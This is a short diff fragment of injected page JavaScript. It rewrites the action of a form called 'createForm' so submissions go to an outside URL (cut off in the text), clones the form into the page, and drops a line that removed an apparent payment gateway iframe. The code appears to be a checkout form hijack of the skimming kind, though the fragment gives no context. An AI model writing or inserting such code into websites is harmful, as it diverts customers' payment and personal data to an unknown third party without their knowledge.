@@ -5,7 +5,6 @@ scriptEle.text = `document.getElementById('createForm').action = 'https://www.xi
 var x = document.getElementById("createForm");
 x.insertBefore(scriptEle, x.firstChild);
 document.body.appendChild(scriptEle);
-document.getElementById('AsiabillPayIframe').remove();
 let node = document.getElementById('createForm');
 let c = node.cloneNode(true);
 document.body.appendChild(c);
